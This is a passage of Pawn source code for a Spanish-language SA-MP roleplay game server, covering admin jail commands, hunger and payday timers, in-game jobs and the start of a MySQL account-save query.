	Mensaje(playerid, -1, "(generando su muerte), eso es CarKill (para realizar estas acciones, debe haber un rol previo y completo).");
	return 1;
}

COMMAND:consejosayudante(playerid, params[]){
	if(cuenta[playerid][cAdministrador] < 1)return Mensaje(playerid, COLOR_GRIS2, "No Autorizado!");
	if(!booleano[AntiAbusos]{playerid})return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty.");
	Mensaje(playerid, -1, "{FF8C00}Guia para Ayudantes.");
	Mensaje(playerid, -1, "{FF8C00}*{FFFFFF} En caso de un Anti-Rol intervenir y explicar cual es el fallo.");
	Mensaje(playerid, -1, "{FF8C00}*{FFFFFF} En caso de ver un Cheat y no haber admin superior usar el comando /advertir");
	Mensaje(playerid, -1, "{FF8C00}*{FFFFFF} En caso de que un Anti-Rol este haciendo DM, congelarlo y explicarle el fallo.");
	Mensaje(playerid, -1, "{FF8C00}*{FFFFFF} Siempre responder dudas y dar el mejor soporte.");
	Mensaje(playerid, -1, "{FF8C00}*{FFFFFF} Antes de /traer a un jugador preguntarle si acepta ser teletransportado");
	Mensaje(playerid, -1, "{FF8C00}*{FFFFFF} Jamas dar /kick a menos que sea un caso extremo o un AFK en el Banco de LS");
	Mensaje(playerid, -1, "{FF8C00}*{FFFFFF} Siempre /sp en roles no aparecer y estorbarlos");
	Mensaje(playerid, -1, "{FF8C00}*{FFFFFF} Prohibido rolear ONDUTY");
	Mensaje(playerid, -1, "{FF8C00}*{FFFFFF} Trollear no esta permitido ni a los Usuarios ni en el Chat administrativo");
	Mensaje(playerid, -1, "{FF8C00}*{FFFFFF} Estar OFFduty cuando hay poco Staff es una expulsion del cuerpo administrativo");
	return 1;
}
COMMAND:unjail(playerid, params[])
{
	new jugador, tmp[84];
	if(cuenta[playerid][cAdministrador] < 2)return Mensaje(playerid, COLOR_GRIS2, "Debes ser minimo Moderador [Rango 2] para usar este comando");
	if(!booleano[AntiAbusos]{playerid})return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty.");
	if(sscanf(params, "u", jugador))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /unjail [Usuario]");
	if(cuenta[jugador][cCarcel] != 1)return Mensaje(playerid, COLOR_ROJO, "Este jugador no esta en Jail-OOC!");
	
	if(cuenta[jugador][cInv1][1] > 0) cuenta[jugador][cInv1][1]--;
	cuenta[jugador][cCarcel] = 1;
	cuenta[jugador][cTiempoCarcel] = 0;
	
	format(tmp, sizeof(tmp), "Usted fue liberado de Jail-OOC ahora tiene %d/7", cuenta[jugador][cInv1][1]);
	Mensaje(jugador, COLOR_ROJO3, tmp);
	return 1;
}
COMMAND:jail(playerid, params[])
{
	new jugador, tiempo, razon[64], tmp[224];
	if(cuenta[playerid][cAdministrador] < 2)return Mensaje(playerid, COLOR_GRIS2, "Debes ser minimo Moderador [Rango 2] para usar este comando");
	if(!booleano[AntiAbusos]{playerid})return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty.");
	if(sscanf(params, "uis[64]", jugador, tiempo, razon))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /jail [Jugador] [Minutos] [Razon]");
	if(!IsPlayerConnected(jugador))return Mensaje(playerid, COLOR_GRIS2, "Este jugador no esta conectado Utiliza: /jailoff");
	if(booleano[npcUse]{jugador})return Mensaje(playerid, COLOR_GRIS1, "Este usuario esta interactuando con un NPC.");
	if(cuenta[jugador][cCarcel] == 1)return Mensaje(playerid, COLOR_GRIS1, "Este usuario ya esta en Jail-OOC!");
	if(cuenta[jugador][cAdministrador])
	{
		format(tmp, sizeof(tmp), "ATENCIÓN: %s intentó JAILEAR a %s", PlayerName(playerid), PlayerName(jugador));
		AdminMensaje(tmp);
		return 1;
	}
		
	cuenta[jugador][cInv1][1]++;
	if(cuenta[jugador][cInv1][1] > 7)
	{
		cuenta[jugador][cAdvertencias]++;
		if(cuenta[jugador][cAdvertencias] >= 3)
		{
			cuenta[jugador][cInv1][1] = 0;
			cuenta[jugador][cAdvertencias] = 0;
			ban(jugador, "Limite de JAILS", Nombre(playerid), "Ninguno");
			return 1;
		}
		cuenta[jugador][cInv1][1] = 0;
		format(tmp, sizeof(tmp), "Usted recibio %d/3 Advertencias Administrativas por cumplir 7/7 Jails OOC, recuerda que a la 3era advertencia es un BAN permanente!", cuenta[jugador][cAdvertencias]);
		Mensaje(jugador, COLOR_ROJO, tmp);
	}
	cuenta[jugador][cCarcel] = 1;
	cuenta[jugador][cTiempoCarcel] = tiempo * 60;
	
	quitarArmas(jugador);
	for(new x=0;x<6;x++)
	{
		inventario[jugador][invArmas][x] = 0;
		inventario[jugador][invBalas][x] = 0;
	}
	SetPosEx(jugador, 325.2867, 305.1505, 999.1484, 348.7300, 5, (jugador + 20));
	
	format(tmp, sizeof(tmp), "%s encarceló a %s por %d minuto(s), razón: %s", PlayerName(playerid), PlayerName(jugador), tiempo, razon);
	Mensaje(jugador, COLOR_ROJO3, tmp);
	AdminMensaje(tmp);
	return 1;
}
COMMAND:pp(playerid, params[])
{
	if(!booleano[gIngreso]{playerid} || !cuenta[playerid][cTutorial])return Mensaje(playerid, COLOR_GRIS2, "Primero debes ingresar.");
	if(booleano[PPersona]{playerid})
	{
		PrimeraPersonaOFF(playerid);
		Mensaje(playerid, COLOR_GRIS2, "Usted salio de modo Primera Persona, Para entrar use /pp.");
	}
	else
	{
		PrimeraPersonaON(playerid);
		Mensaje(playerid, COLOR_GRIS2, "Usted entro en modo Primera Persona, Para salir use /pp.");
	}
	return 1;
}
command(ocultarbarra, playerid, params[])
{
	if(booleano[TextShow]{playerid})
	{
		booleano[TextShow]{playerid} = false;
		PlayerTextDrawShow(playerid, InfoText[playerid][1]);
		PlayerTextDrawShow(playerid, InfoText[playerid][2]);
		PlayerTextDrawShow(playerid, InfoText[playerid][3]);
	}
	else
	{
		booleano[TextShow]{playerid} = true;
		PlayerTextDrawHide(playerid, InfoText[playerid][1]);
		PlayerTextDrawHide(playerid, InfoText[playerid][2]);
		PlayerTextDrawHide(playerid, InfoText[playerid][3]);
		HideProgressBarForPlayer(playerid, bHambre[playerid]);
	}
	return 1;
}

command(cmateriales, playerid, params[])
{
	if(IsPlayerInRangeOfPoint(playerid, 20.0, 122.8424, -294.3255, 1.5781))
	{
		new string[128], itemid;
		if(sscanf(params, "d", itemid))return Mensaje(playerid, COLOR_GRIS2, "Utiliza /cmateriales <Cantidad>"), Mensaje(playerid, COLOR_GRIS2, "Cada material cuesta 6$");
		if(itemid < 1 || itemid > 1000)return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} Usted no puedes comprar más de 1000 materiales.");
		new Valor = itemid * 4;
		if(obtenerDinero(playerid) < Valor)return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} Usted no tiene el dinero necesario.");
		cuenta[playerid][cMateriales] += itemid;
		pierdeDinero(playerid, Valor);
		format(string, sizeof(string), "Atención!:{FFFFFF} Compraste una cantidad de %d materiales.", itemid);
		Mensaje(playerid, COLOR_AZUL_CLARO, string);
	}else return Mensaje(playerid, COLOR_GRIS2, "Usted no esta cerca de la venta de materiales, esta marcado en el mapa!"), SetPlayerCheckpoint(playerid, 122.8424, -294.3255, 1.5781, 5.0);
	return 1;
}
command(localizar, playerid, params[]){
	new item;
	if(IsPlayerInRangeOfPoint(playerid, 5.0, 2111.7705, -1910.9108, 13.5681)){
	if(sscanf(params, "d", item))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /localizar [Slot 1-4]");
		switch(item){
			case 1: if(cuenta[playerid][cCoche] != 0){PosicionVehicular(playerid, cuenta[playerid][cCoche]);}else return Mensaje(playerid, COLOR_GRIS1, "Usted no posee vehiculo en este slot.");
			case 2: if(cuenta[playerid][cCoche2] != 0){PosicionVehicular(playerid, cuenta[playerid][cCoche2]);}else return Mensaje(playerid, COLOR_GRIS1, "Usted no posee vehiculo en este slot.");
			case 3: if(cuenta[playerid][cCoche3] != 0){PosicionVehicular(playerid, cuenta[playerid][cCoche3]);}else return Mensaje(playerid, COLOR_GRIS1, "Usted no posee vehiculo en este slot.");
			case 4: if(cuenta[playerid][cCoche4] != 0){PosicionVehicular(playerid, cuenta[playerid][cCoche4]);}else return Mensaje(playerid, COLOR_GRIS1, "Usted no posee vehiculo en este slot.");
		}
	}else return Mensaje(playerid, COLOR_GRIS1, "Usted no este en el puesto de localizacion.");
	return 1;
}
CallBack::ActivarEffectoHambre(playerid, opcion)
{
	switch(opcion)
	{
		case 1:
		{
			SetPlayerDrunkLevel(playerid, 200000);
		}
		default: SetPlayerDrunkLevel(playerid, 0);
	}
	return 1;
}
CallBack::StreamMediaHora()
{
	new string[144];
	switch(random(12))
	{
		case 0: MensajeGlobal(COLOR_AMARILLO, "INFO: {FFFFFF}Recuerda visitar nuestro foro y mantenerte al día con actualizaciones.");
		case 1: MensajeGlobal(COLOR_AMARILLO, "INFO: {FFFFFF}Recuerda renovar los Impuestos de tu Casa/Auto/Negocio en el Ayuntamiento");
		case 2: MensajeGlobal(COLOR_AMARILLO, "INFO: {FFFFFF}Para obtener el sistema VIP, realiza contacto con la administración.");
		case 3: MensajeGlobal(COLOR_AMARILLO, "INFO: {FFFFFF}Para el modo en primera persona usa /pp.");
		case 4: MensajeGlobal(COLOR_AMARILLO, "INFO: {FFFFFF}¿Encontraste algún bug?, puedes reportarlo en nuestro Foro!.");
		case 5: MensajeGlobal(COLOR_AMARILLO, "INFO: {FFFFFF}Para ocultar los logos del servidor utiliza /ocultarbarra");
		case 6: MensajeGlobal(COLOR_AMARILLO, "INFO: {FFFFFF}¿Tienes dudas? Utiliza /duda.");
		case 7: MensajeGlobal(COLOR_AMARILLO, "INFO: {FFFFFF}¿Antirol? /re(reportar) o pueden reportan en nuestro foro.");
		case 8: MensajeGlobal(COLOR_AMARILLO, "INFO: {FFFFFF}Visitanos para informarte de todo en foro.CenterIsland.com.");
		case 9: MensajeGlobal(COLOR_AMARILLO, "INFO: {FFFFFF}Recuerda tomar a menudo Screenshots de tu /cuenta.");
		case 10: MensajeGlobal(COLOR_AMARILLO, "INFO: {FFFFFF}Recuerda guardar los datos de tu cuenta /guardarcuenta.");
		case 11: MensajeGlobal(COLOR_AMARILLO, "INFO: {FFFFFF}No olvides agregar nuestra IP a favoritos!");
	}

	for(new i=0, t=GetMaxPlayers(); i<t; i++)
	{
		if(!IsPlayerConnected(i))continue;
		/*if(cuenta[i][cEnfermedad] || cuenta[i][cEnfermedad2] || cuenta[i][cEnfermedad3])
		{
			new Float:vida;
			GetPlayerHealth(i, vida);
			new Float:vidarestante = (vida * 5.0) / 100.0;
			SetHP(i, vida - vidarestante);
			Mensaje(i, COLOR_ROJO, "Usted esta enfermo, vaya a diagnosticarse con un medico.");
		}*/
		
		UpdateProgressBar(bHambre[i], i);
		cuenta[i][cHambre] += 1;
		
		if(!booleano[AdminDuty]{i})
		{
			switch(cuenta[i][cHambre])
			{
				case 60, 70, 80, 90:
				{
					ActivarEffectoHambre(i, 1);
					SetTimerEx("ActivarEffectoHambre", 3000, false, "dd", i, 2);
					
					AccionMe(i, "siente un leve mareo por desnutricion.");
					AccionDo(i, "Podras notar que todo comienza a dar vueltas.");
				}
				case 100 .. 1000:
				{
					ActivarEffectoHambre(i, 1);
					SetTimerEx("ActivarEffectoHambre", 3000, false, "dd", i, 2);
					
					new Float:vida;
					GetPlayerHealth(i, vida);
					new Float:vidarestante = (vida * 10.0) / 100.0;//Disminuye un 10% de su vida
					SetHP(i, vida - vidarestante);

					AccionMe(i, "siente dolores de estomago.");
					AccionDo(i, "Su salud baja levemente(Desnutricion).");
				}
			}
		}
		if(obtenerDinero(i) < 0)
		{
			if(!Advertencia_Debe[i])
			{ 
				format(string, sizeof(string), "Tienes una deuda de: $%d con el estado, tienes hasta el proximo pago de impuestos para pagar o seras arrestado.", obtenerDinero(i));
				Mensaje(i, COLOR_ROJO3, string);
				Advertencia_Debe[i] = 1;
			}
		}
		else
		{
			Advertencia_Debe[i] = 0;
		}
	}
	
	for(new i=0;i<sizeof(negocio);i++)
	{
		if(negocio[i][bOwned])
		{
			if(negocio[i][bProduc] > 50)
			{
				new subNegocio = (negocio[i][bBuyPrice] * 22) / 10000;
				negocio[i][bProduc] -= subNegocio / 50;
				negocio[i][bTill] += subNegocio - 17;
				negocio[i][bTillEx] += 17;
			}
		}
	}
	
	accionesEstado();
	return 1;
}

CallBack::Timer5000ms()//bucle timer cada 2000ms
{
	if(indiceNegocio > sizeof(negocio) - 1) indiceNegocio = 0;
	if(negocio[indiceNegocio][bOwned] && gettime() > negocio[indiceNegocio][bTime])
	{
		VenderLocal(indiceNegocio);
		ActualizaNegocio(indiceNegocio);
	}
	else
	{
		ActualizaNegocio(indiceNegocio);
	}
	indiceNegocio++;
	
	if(indiceCasa > sizeof(casa) - 1) indiceCasa = 0;
	if(casa[indiceCasa][hOwned] && gettime() > casa[indiceCasa][hTime])
	{
		VenderPropiedad(INVALID_PLAYER_ID, indiceCasa);
		ActualizaCasa(indiceCasa);
	}
	else
	{
		ActualizaCasa(indiceCasa);
	}
	indiceCasa++;
	
	if(indiceCoches > sizeof(autos) - 1) indiceCoches = 0;
	if(autos[indiceCoches][cOwned] && gettime() > autos[indiceCoches][cVehTime])
	{
		VenderAuto(indiceCoches);
	}
	else
	{
		ActualizaVehiculo(indiceCoches);
	}
	indiceCoches++;
	
	//
	StreamCincoSegundos();
	return 1;
}
CallBack::Timer1000ms()
{
	if(floodinforme >= 1) floodinforme++;
	if(floodinforme >= 30) floodinforme = 0;
	for(new playerid=0, t=GetMaxPlayers(); playerid<t; playerid++)
	{
		if(!IsPlayerConnected(playerid))continue;
		SetPlayerScore(playerid, cuenta[playerid][cNivel]);
		static string[128];

		if(cuenta[playerid][cHoras] < 2 && GetPlayerWeapon(playerid))
		{
			quitarArmas(playerid);
			format(string, sizeof(string), "No puedes usar armas hasta que cumplas 2 horas, solo tienes %d horas con %d minutos.", cuenta[playerid][cHoras], cuenta[playerid][cMinutos]);
			Mensaje(playerid, COLOR_ROJO, string);
		}
		if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
		{
			for(new i=0;i<sizeof(espinas);i++)
			{
				if(IsPlayerInRangeOfPoint(playerid, 3.0, espinas[i][sX], espinas[i][sY], espinas[i][sZ]))
				{
					if(espinas[i][sCreated])
					{
						new panels, doors, lights, tires;
						new carid=GetPlayerVehicleID(playerid);
						GetVehicleDamageStatus(carid, panels, doors, lights, tires);
						tires=encode_tires(1, 1, 1, 1);
						UpdateVehicleDamageStatus(carid, panels, doors, lights, tires);
					}
				}
			}
		}
		if(IsPlayerAdmin(playerid))
		{ 
			if(!RetornarNombre(playerid))
			{
				format(string, sizeof(string), "[Seguridad ZonaZero]: %s[%d] ha sido Baneado por entrar a la RCON.", Nombre(playerid), playerid);
				AdminMensaje(string);
				
				new tmp15[24];
				format(tmp15, sizeof(tmp15), "[NPC]%s", nonplayers[random(sizeof(nonplayers))][npcNombre]);
				ban(playerid, "RconAdmin-Hack", tmp15, "Ninguno");
				return 1;
			}
		}
		if(booleano[jObjetivo]{playerid})//esta pidiendo refuerzos
		{
			static Float:iPos[3];
			GetPlayerPos(playerid, iPos[0], iPos[1], iPos[2]);
			for(new i=0, _max=GetMaxPlayers();i<_max;i++)
			{
				if(i == playerid) continue;
				if(cuenta[i][cMiembro] == cuenta[playerid][cMiembro])
				{
					SetPlayerCheckpoint(i, iPos[0], iPos[1], iPos[2], 5.0);
				}
			}
		}
	}
	return 1;
}

CallBack::Paydays()
{
	PayDayLeft = MaxTimePayDay;//listo
	for(new i=0, _max=GetMaxPlayers();i<_max;i++)
	{
		cuenta[i][cCobrap] += 1;
		cuenta[i][cCobro] = 0;
		if(cuenta[i][cEmpleado])
		{
			cuenta[i][cEmpleado] -= 1;
		}
		Mensaje(i, COLOR_AZUL_CLARO, "GOB:{FFFFFF} Atención!, se está retirando el subsidio de ciudadanía en el Banco Central o interactua con un cajero.");
	}
	return 1;
}
CallBack::recogerBasura(playerid)
{
	new id = cuenta[playerid][selecciono2], vehicle = GetPlayerVehicleID(playerid);
	if(IsPlayerInRangeOfPoint(playerid, 10.0, trabBasurero[id][basPos][0], trabBasurero[id][basPos][1], trabBasurero[id][basPos][2]))
	{
		AttachDynamicObjectToVehicle(trabBasurero[id][basObjeto], vehicle, 0.0, -3.975001, 1.425, -137.699935, 0.0, 0.0);
		
		SetTimerEx("transCargamento", 5000, false, "dd", playerid, 7);
		GameTextForPlayer(playerid, "~w~Recogiendo basura espere...", 5000, 3);
		TogglePlayerControllable(playerid, false);
	}
	else if(IsPlayerInRangeOfPoint(playerid, 10.0, 2186.4143, -1978.9795, 13.2793))
	{
		new paga = 550 + random(100);
		GiveSkillPlayer(playerid, 10);
		trabajoPagar(playerid, 10, paga);
		cuenta[playerid][selecciono] = 0;
		cuenta[playerid][selecciono2] = 0;
		SetVehicleToRespawn(vehicle);
		DisablePlayerCheckpoint(playerid);
	}
	return 1;
}
CallBack::comenzarPescar(playerid)
{
	new id = random(sizeof(trabPescador));
	cuenta[playerid][selecciono]++;
	switch(cuenta[playerid][selecciono])
	{
		case 0 .. 3:
		{
			if(!id)id = 6;
			TextoInformatico(8, playerid, "Dirijase al punto ~r~Rojo~w~ marcado en el minimapa");
			SetPlayerCheckpoint(playerid, trabPescador[id][pesPos][0], trabPescador[id][pesPos][1], trabPescador[id][pesPos][2], 7.0);
		}
		case 4:
		{
			TextoInformatico(8, playerid, "Dirijase al punto ~r~Rojo~w~ marcado en el minimapa");
			SetPlayerCheckpoint(playerid, trabPescador[0][pesPos][0], trabPescador[0][pesPos][1], trabPescador[0][pesPos][2], 7.0);
		}
		default:
		{
			new paga = 400 + random(100), carid = GetPlayerVehicleID(playerid);
			GiveSkillPlayer(playerid, 11);
			trabajoPagar(playerid, 11, paga);
			cuenta[playerid][selecciono] = 0;
			SetVehicleToRespawn(carid);
			SetPosEx(playerid, 65.0032, -1705.5344, 4.9273, 102.7430, 0, 0);
			DisablePlayerCheckpoint(playerid);
		}
	}
	return 1;
}
CallBack::comenzarCosechar(playerid)
{
	new id = random(sizeof(trabAgricultor));
	cuenta[playerid][selecciono]++;
	switch(cuenta[playerid][selecciono])
	{
		case 0 .. 8:
		{
			if(!id)id = 6;
			TextoInformatico(8, playerid, "Dirijase al punto ~r~Rojo~w~ marcado en el minimapa");
			addObjetoTrabajo(playerid, 1, trabAgricultor[id][agriPos][0], trabAgricultor[id][agriPos][1], trabAgricultor[id][agriPos][2]);
			SetPlayerCheckpoint(playerid, trabAgricultor[id][agriPos][0], trabAgricultor[id][agriPos][1], trabAgricultor[id][agriPos][2], 7.0);
		}
		case 9:
		{
			addObjetoTrabajo(playerid, 1, 0.0000, 0.0000, 0.0000);
			TextoInformatico(8, playerid, "Dirijase al punto ~r~Rojo~w~ marcado en el minimapa");
			SetPlayerCheckpoint(playerid, trabAgricultor[0][agriPos][0], trabAgricultor[0][agriPos][1], trabAgricultor[0][agriPos][2], 7.0);
		}
		default:
		{
			new paga = 400 + random(100), carid = GetPlayerVehicleID(playerid);
			GiveSkillPlayer(playerid, 6);
			trabajoPagar(playerid, 6, paga);
			cuenta[playerid][selecciono] = 0;
			SetVehicleToRespawn(carid);
			DisablePlayerCheckpoint(playerid);
		}
	}
	return 1;
}
CallBack::addObjetoTrabajo(playerid, trabajo, Float:x, Float:y, Float:z)
{
	switch(trabajo)
	{
 		case 1:
		{
			DestroyDynamicObject(cuenta[playerid][objetos][0]);
			DestroyDynamicObject(cuenta[playerid][objetos][1]);
			if(x != 0.0000)
			{
				cuenta[playerid][objetos][0] = CreateDynamicObject(2901, x, y, z + 0.65, 0.0000, 0.0000, 0.0000);
				cuenta[playerid][objetos][1] = CreateDynamicObject(2901, x, y + 0.95, z + 0.65, 0.0000, 0.0000, 0.0000);
			}
		}
	}
	return 1;
}

CallBack::PayDay(playerid)
{ 
	new account, interest, secur, checks, moneda, ebill = 100;
	new sal = 250;

	if(cuenta[playerid][cCobrap] >= 1)
	{
		cuenta[playerid][cCobrap] = (cuenta[playerid][cCobrap] < 0) ? (cuenta[playerid][cCobrap] = 0) : (cuenta[playerid][cCobrap] -= 1);

		account = cuenta[playerid][cDineroBanco];
		moneda = random(6) + 2;

		//ZZCASH
		switch(cuenta[playerid][cDonador])
		{
			case 1:		checks = 600;
			case 2:		checks = 650;
			case 3:		checks = 700;
			case 4:		checks = 750;
			default:	checks = 550;
		}
		
		if(cuenta[playerid][cPackID] == 1)checks += 1150;
		else if(cuenta[playerid][cPackID] == 2)checks += 1200;

		account += checks;
		interest = cuenta[playerid][cDineroBanco] / 20000;

		/*new BonusSkill1=0, BonusSkill2=0;
		for(new i;i<MAX_SKILLS_WORK;i++)
		{
			BonusSkill1 += cuenta[playerid][cSkills][i];
		}
		BonusSkill1 = BonusSkill1 / 11;
		BonusSkill2 = (550 * BonusSkill1) / 100;*/

		cuenta[playerid][cDineroBanco] = account+interest;
		Tax += TaxValue;
		cuenta[playerid][cDineroBanco] -= TaxValue;
		
		switch(cuenta[playerid][cSeguro])
		{
			case 0: secur = 0;
			case 1: secur = 150;
		}
		
		cuenta[playerid][cDineroBanco] -= secur;
		
		if(cuenta[playerid][cCasa] != 9999)
		{
			cuenta[playerid][cDineroBanco] -= ebill;
		}
		else
		{
			ebill = 0;
		}		
		
		if(cuenta[playerid][cCasa2] != 9999)
		{
			cuenta[playerid][cDineroBanco] -= ebill;
		}
		else
		{
			ebill = 0;
		}

		if(Team_LSPD(playerid) || Team_FBI(playerid) || Team_SAMUR(playerid))
		{
			//Todas las facciones ganan 400$ y por rango 100$.
			cuenta[playerid][cDineroBanco] += sal;
			cuenta[playerid][cDineroBanco] += 100 * cuenta[playerid][cRango];
		}

		new iString[128]; 
		Mensaje(playerid, -1, "{4169E1}-----------------------------------------------------------------------------------------");
		Mensaje(playerid, -1, "{4169E1}                                Actividad Bancaria");
		format(iString, sizeof(iString), "                                  {FFFFFF}%s", PlayerName(playerid));
		Mensaje(playerid, -1, iString);
		format(iString, sizeof(iString), "{FFFFFF}Pago [$%d] Interés [$%d] Impuestos [$%d]", checks, interest, TaxValue);
		Mensaje(playerid, -1, iString);
		format(iString, sizeof(iString), "{FFFFFF}Gastos Domicilio [$%d] Seguro Médico [$%d] Beneficios {68954D}[$%d]", ebill, secur, checks+interest-ebill-TaxValue-secur);
		Mensaje(playerid, -1, iString);

		if(Team_LSPD(playerid) || Team_FBI(playerid) || Team_SAMUR(playerid))
		{
			format(iString, sizeof(iString), "{FFFFFF}Salario [$%d] Adicional por rango [$%d] Total [$%d]", sal, 90 * cuenta[playerid][cRango], sal + (100 * cuenta[playerid][cRango]));
			Mensaje(playerid, -1, iString);
		}
		
		//ZZCASH
		switch(cuenta[playerid][cDonador])
		{
			case 1:
			{
				new Float:liquidacion = float(cuenta[playerid][cDineroBanco]) * 0.03 / 100.0;
				format(iString, sizeof(iString), "{FFFFFF}Abono intereses liquidacion: {008000}%d$", floatround(liquidacion));
				Mensaje(playerid, -1, iString);
				cuenta[playerid][cDineroBanco] += floatround(liquidacion);
			}
			case 2:
			{
				new Float:liquidacion = float(cuenta[playerid][cDineroBanco]) * 0.03 / 100.0;
				format(iString, sizeof(iString), "{FFFFFF}Abono intereses liquidacion: {008000}%d$", floatround(liquidacion));
				Mensaje(playerid, -1, iString);
				cuenta[playerid][cDineroBanco] += floatround(liquidacion);
			}
			case 3:
			{
				new Float:liquidacion = float(cuenta[playerid][cDineroBanco]) * 0.06 / 100.0;
				format(iString, sizeof(iString), "{FFFFFF}Abono intereses liquidacion: {008000}%d$", floatround(liquidacion));
				Mensaje(playerid, -1, iString);
				cuenta[playerid][cDineroBanco] += floatround(liquidacion);
			}
			case 4:
			{
				new Float:liquidacion = float(cuenta[playerid][cDineroBanco]) * 0.09 / 100.0;
				format(iString, sizeof(iString), "{FFFFFF}Abono intereses liquidacion: {008000}%d$", floatround(liquidacion));
				Mensaje(playerid, -1, iString);
				cuenta[playerid][cDineroBanco] += floatround(liquidacion);
			}
		}
		
		format(iString, sizeof(iString), "{FFFFFF}Antiguo Balance {F78600}[$%d] {FFFFFF}Balance Actual {68954D}[$%d]", cuenta[playerid][cDineroBanco]-checks-interest+ebill+TaxValue+secur, cuenta[playerid][cDineroBanco]);
		Mensaje(playerid, -1, iString);
		format(iString, sizeof(iString), "{FFFF00}Usted ha ganado +%d monedas", moneda);
		Mensaje(playerid, -1, iString);
		Mensaje(playerid, -1, "{4169E1}-----------------------------------------------------------------------------------------");

		cNicotina[playerid]		= 0;
		cEnergysil[playerid]	= 0;	
		cSIDA[playerid]			= 0;
		cCancer[playerid]		= 0;		
		cEpilepsia[playerid]	= 0;
		cuenta[playerid][cCobro] = 1;
		cuenta[playerid][cMonedas] += moneda;
		//cuenta[i][pMusculoso] = 0;
		cuenta[playerid][cHorasJugadas] += 1;
		cuenta[playerid][cHambre] += 5;
		//cuenta[i][pPeso] += 1;
		cuenta[playerid][cEmpleado] -= 1;
		
		//ZZCASH
		switch(cuenta[playerid][cDonador])
		{
			case 1: 	cuenta[playerid][cExperiencia] += 2;
			case 2: 	cuenta[playerid][cExperiencia] += 2;
			case 3: 	cuenta[playerid][cExperiencia] += 3;
			case 4: 	cuenta[playerid][cExperiencia] += 3;
			default:	cuenta[playerid][cExperiencia] += 1;
		}
		
		if(cuenta[playerid][cPackID] == 1) cuenta[playerid][cExperiencia] += 2;
		else if(cuenta[playerid][cPackID] == 2) cuenta[playerid][cExperiencia] += 3;

		if(DobleOn == 1) cuenta[playerid][cExperiencia] += 1;
		if(TripleOn == 1) cuenta[playerid][cExperiencia] += 2;
		
		if(Advertencia_Debe[playerid])
		{
		Mensaje(playerid, COLOR_ROJO3, "Usted fallo en pagar su deuda, estara uno segundos en la prisión.");
		GameTextForPlayer(playerid, "~r~Atrapado!", 2000, 1);
		SetPosEx(playerid, 197.5159, 174.6245, 1003.0234, 3.1802, 3, 0);
		cuenta[playerid][cCarcel] = 3;
		cuenta[playerid][cTiempoCarcel] = 240;
		quitarArmas(playerid);
		MoneyResetToPlayer(playerid);
		cuenta[playerid][cBusqueda] = 0; 
		format(iString, sizeof(iString), "Usted es encarcelado por %d segundos. Fianza: Deuda con el Estado", cuenta[playerid][cTiempoCarcel]);
		Mensaje(playerid, COLOR_AZUL_CLARO, iString);
		Advertencia_Debe[playerid] = 0;
		}
	}
	return 1;
}

strtok(const string[], &index)
{
	new length = strlen(string);
	while ((index < length) && (string[index] <= ' '))
	{
		index++;
	}

	new offset = index;
	new result[20];
	while ((index < length) && (string[index] > ' ') && ((index - offset) < (sizeof(result) - 1)))
	{
		result[index - offset] = string[index];
		index++;
	}
	result[index - offset] = EOS;
	return result;
}

CallBack::UnSegundoStreamed()
{
	static Contador[3];
	for(new i; i < sizeof(Contador); i++) Contador[i]++;

	if(Contador[0] >= 30)
	{
		Contador[0] = 0;
		restarGasolina();
	}
	
	if(Contador[1] >= 60)
	{
		Contador[1] = 0;
		for(new playerid=0, _max=GetMaxPlayers();playerid<_max;playerid++)
		{
			if(HireKeyTime[playerid] != 0) HireKeyTime[playerid]--;
			if(HireKeyTime[playerid] == 0 && HireKey[playerid] != 9999)
			{
				SetVehicleToRespawn(HireKey[playerid]);
				HireKey[playerid] = 9999;
				HireKeyTime[playerid] = 0;
				Mensaje(playerid, COLOR_AZUL_CLARO, "Atención: {FFFFFF} Su renta caducó, por lo tanto se le quitó el vehículo.");
			}

			cuenta[playerid][cMinutos]++;
			if(cuenta[playerid][cMinutos] >= 60) cuenta[playerid][cMinutos] = 0, cuenta[playerid][cHoras]++;
			
			if(booleano[AdminDuty]{playerid})
			{
				cuenta[playerid][cAMinutos]++;
				if(cuenta[playerid][cAMinutos] >= 60) cuenta[playerid][cAMinutos] = 0, cuenta[playerid][cAHoras]++;
			}
		}
		SyncUp();
	}
	return 1;
}

CallBack::GuardarDatosMySQL(playerid)
{
	new Float:poss[4];
	GetPlayerPos(playerid, poss[0], poss[1], poss[2]);
	GetPlayerFacingAngle(playerid, poss[3]);
	printf("Estado del jugador %s(ID: %d) #1: %d (Coord..: %f, %f, %f, %f)", Nombre(playerid), playerid, GetPlayerState(playerid), poss[0], poss[1], poss[2], poss[3]);
	
	new tmp[2048];
	
	cuenta[playerid][cMundo] = GetPlayerVirtualWorld(playerid);
	cuenta[playerid][cInterior] = GetPlayerInterior(playerid);
	GetPlayerPos(playerid, cuenta[playerid][cPosiciones][0], cuenta[playerid][cPosiciones][1], cuenta[playerid][cPosiciones][2]);
	GetPlayerArmour(playerid, cuenta[playerid][cArmadura]);
	GetPlayerHealth(playerid, cuenta[playerid][cVida]);
	
	//ActualizarBolsa(playerid);
	
	for(new i=0;i<12;i++)
	{
		GetPlayerWeaponData(playerid, i, cuenta[playerid][cArma][i], cuenta[playerid][cMunicion][i]);
	}
	
	tmp[0] = '\0';
	mysql_format(servidor[mysqlControl], tmp, sizeof(tmp), "UPDATE zz_usuarios SET nivel=%d, contrato=%d, niveladmin=%d, zzcash=%d, \
	connectedtime=%d, acento=%d, registro=%d, sexo=%d, edad=%d, origen=%d, estilocaminar=%d, cobro=%d, stereo=%d, respeto=%d, \
	dinero=%d, dinerobanco=%d, cheques=%d, kills=%d, muertes=%d, arrestos=%d, lottonr=%d, trabajo=%d, carcel=%d, tiempocarcel=%d, \
	materiales=%d, drogas=%d, speed=%d, ectasy=%d, ritalin=%d, heroina=%d, marihuana=%d, lider=%d, miembro=%d, rango=%d, caracter=%d, \
	interior=%d, virtualworld=%d, team=%d, numerotelefonico=%d, minutos=%d, minutr=%d, horas=%d, mtexto=%d, ipod=%d, \
